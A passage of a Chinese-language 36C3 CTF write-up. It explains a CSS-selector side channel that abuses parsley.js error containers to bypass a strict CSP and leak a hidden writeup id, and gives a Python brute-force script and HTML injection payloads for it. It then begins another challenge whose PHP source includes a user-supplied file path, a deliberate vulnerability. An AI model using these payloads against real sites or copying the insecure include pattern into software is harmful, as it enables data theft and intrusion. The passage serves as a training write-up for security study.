        ">
//先知竟然又把emoji这里给截断了
接着我们来看看 general.php 中的防御措施
     true, 'cookie_samesite' => 'Strict']);
    //...
    function id() {
        return bin2hex(random_bytes(8));
    }
    $nonce = base64_encode(id());
    //...
    header('x-xss-protection: 1; mode=block');
    header('X-Content-Type-Options: nosniff');
    header('x-frame-options: DENY');
    header('Referrer-Policy: no-referrer');
    header("Feature-Policy: geolocation 'none'; midi 'none'; sync-xhr 'none'; microphone 'none'; camera 'none'; magnetometer 'none'; gyroscope 'none'; speaker 'none'; fullscreen 'none'; payment 'none'; usb 'none'; vr 'none'; encrypted-media 'none'");
    header("Content-Security-Policy: default-src 'none'; script-src 'nonce-".$nonce."' https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js https://cdnjs.cloudflare.com/ajax/libs/parsley.js/2.8.2/parsley.min.js; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; require-sri-for script style;");
而`script-src`设置的 nonce 只在 header.php 使用了，而且我们也拿不到这个 nonce
所以我们可能需要往点击事件那一方面思考，并且利用题目引入的两个 js 文件入手，一个 jquery.js ，另一个 parsley.js。
### Parsley.js
我们可以去 [parsley.js doc](https://parsleyjs.org/doc/index.html) 看到该 lib
的简单说明以及使用：
> Parsley is a javascript form validation library. It helps you provide your
> users with feedback on their form submission before sending it to your
> server. It saves you bandwidth, server load and it saves time for your
> users.
>
> Javascript form validation is not necessary, and if used, it **does not
> replace strong backend server validation.**
>
> That's why Parsley is here: to let you define your general form validation,
> implement it on the backend side, and simply port it frontend-side, with
> maximum respect to user experience best practices.
可以看出这是个简单的前端验证库，简单查一下文档，我们可以发现有几个有意思的 API：
> **data-parsley-trigger="input"**
>
> Specify one or many javascript events that will trigger item validation,
> before any failure. To set multiple events, separate them with a space data-> parsley-trigger="focusin focusout". Default is null. See the various events
> supported by jQuery.
>
> **data-parsley-error-message="my message"**
>
> Customize a unique global message for the field.
>
> **data-parsley-errors-container="#element"**
>
> Specify the existing DOM container where ParsleyUI should put the errors. It
> is also possible to configure it with a callback function from javascript,
> see the annotated source.
根据文档，我们可以利用`data-parsley-trigger`设置我们的触发方式，使用`data-parsley-error-message`来自定义我们的错误信息，使用`data-parsley-errors-container`来自定义我们的显示错误的位置。
根据文档，我们可以简单用一个`data-parsley-validate`指定我们需要验证的表单，然后利用错误信息把元素标签输出出来，并且我们接着还可以利用指定输出位置来控制输出，例如：
            " 
                data-parsley-required
                data-parsley-errors-container="#div1"/>
`data-parsley-trigger`指定了`blur`事件，也就是当我们的 input 失焦时，会显示我们的错误信息，并且在 id 为 div1
的元素中显示，更重要的是，浏览器也将其进行了渲染。
### Click
回到题目当中，admin 所做的动作有两个，一个就是登录，根据题目信息，我们基本上对这个操作没办法进行什么干扰，另外一个就是点赞了，更具体来说就是通过
show.php 打开你的 writeup 内容，并且点击页面上 id 为 like 的 input
标签，所以我们更可能的事对点赞操作进行一个干扰或者其他的操作，并且根据实际测试，通过
`selenium.webdriver`调用`find_element_by_xpath`函数得到的 id 为 like 的 input
元素只能有第一个，也就是说，即使我们在 writeup 内容中插入一个 id 为 like 的 input 标签，admin
也只会根据页面顺序拿到第一个点赞 input 。
并且 CSP 也限制得很严格，似乎陷入了僵局，但是如果我们有以上 parsley.js 的知识，我们似乎可以通过错误信息来构造一些 Payload 。
首先，因为`find_element_by_xpath`只会得到第一个 id 为 like 的 input 标签，而我们通过 parsley.js
可以将错误信息输出到指定页面位置，所以我们大概可以有一个想法，把一个没有用的单独的 id 为 like 的 input 标签插入到原来的点赞按钮之前。
但是这有什么用呢？我们再来仔细看看 admin 要点赞的那个页面
页面上部分是 header.php ，会展示当前用户所提交的 writeup ，也就是说 admin 的这个页面，第一个也是唯一一个 a 标签就是 flag
的地址，现在的问题就变成了我们怎么获取这个地址的问题了，更详细的来说，我们如何获取这个 a 标签中的 href 属性值，或者更确切的说就是获取
writeup id 的事情了。
### CSS Selector
如何获取 a 标签中的 href 属性值貌似也就跟我们之前提到的`data-parsley-errors-container` API 有关了，而这个
API 又支持 CSS 选择器，那我们是不是可以通过 CSS 选择器来让我们的报错信息放到这个 a 标签之后呢，这样以来也就直接就放到了点赞按钮之前了。
类似之前 XCTF Final 一个 CSS
侧信道的题目，我们可以通过利用`a[href^='/show.php?id={flag}]`的形式来进行元素选择。
也就是说，当我们传入的 flag 值与页面中的 href 属性值也就是 writeup id 前部分完全匹配的时候，我们可以把一个无效的 id=like
input 标签插入到该 a 标签之后，亦即真正用于提交 like 请求的 input 标签之前；如果我们传入的 flag 值与页面中的 href
属性值也就是 writeup id 前部分不完全匹配的，parsley.js 什么也不会做，admin 会正常地点赞，我们可以正常地在自己的 writeup
页面看到 admin 的点赞。
所以基于这个差异，我们可以利用这种形式来进行一个侧信道攻击获取 flag 的 writeup id。
脚本编写也比较简单：
    import requests
    import time
    s = requests.Session()
    base_url = "http://ip:8001/"
    res = s.get(base_url)
    pos = res.text.find('name="c" value="') + len('name="c" value="')
    csrftoken = res.text[pos:pos+16]
    ss = "1234567890abcdef"
    flag = ""
    for i in range(16):
        for j in ss:
            payload = f"' data-parsley-errors-container=\"a[href^='/show.php?id={flag + j}']\" autofocus>"
            data = {'c': csrftoken, 'content': payload}
            res = s.post(base_url + "add.php", data=data, allow_redirects=False)
            # print(res.headers)
            location = res.headers['Location']
            pos = location.find('id=') + 3
            wp = location[pos:]
            data = {'c': csrftoken, 'id': wp}
            res = s.post(base_url + "admin.php", data=data)
            time.sleep(3)
            res = s.get(f"http://ip:8001/show.php?id={wp}")
            # print(res.text)
            txt = res.text.replace("\n", "").replace("\r", "")
            if "Liked byadmin" not in txt:
                flag += j
                print(i,flag)
                break
拿到 writeup id 之后直接访问即可：
### Other Selector
当然该页面不仅可以使用 a 标签的 href 属性进行获取 writeup id，也可以获取它 value 值，例如：
      " data-parsley-required
             data-parsley-errors-container="a:contains('Writeup - 5'):eq(0)" />
或者使用`data-parsley-equalto` API 进行判断属性值：
> **data-parsley-equalto="#anotherfield"**
>
> Validates that the value is identical to another field's value (useful for
> password confirmation check).
        '
            value='a[href^="/show.php?id=GUESS"]'
            autofocus>
## Includer
> **Difficulty estimate** : medium
>
> **Solved** :9/321
>
> **Points** : round(1000 · min(1, 10 / (9 + [9 solves]))) = **556** points
>
> **Description:**
>
> Just sitting here and waiting for PHP 8.0 (lolphp).
>
> **Download:**
>
> [includer-df39401c4c1c28ab.tar.xz (3.5
> KiB)](https://github.com/ZeddYu/36c3-CTF-Web/blob/master/includer/includer-> df39401c4c1c28ab.tar.xz)
题目给出源代码以及部署文件，源代码如下：
    <?php
    declare(strict_types=1);
    $rand_dir = 'files/'.bin2hex(random_bytes(32));
    mkdir($rand_dir) || die('mkdir');
    putenv('TMPDIR='.__DIR__.'/'.$rand_dir) || die('putenv');
    echo 'Hello '.$_POST['name'].' your sandbox: '.$rand_dir."\n";
    try {
        if (stripos(file_get_contents($_POST['file']), '<?') === false) {
            include_once($_POST['file']);
        }
    }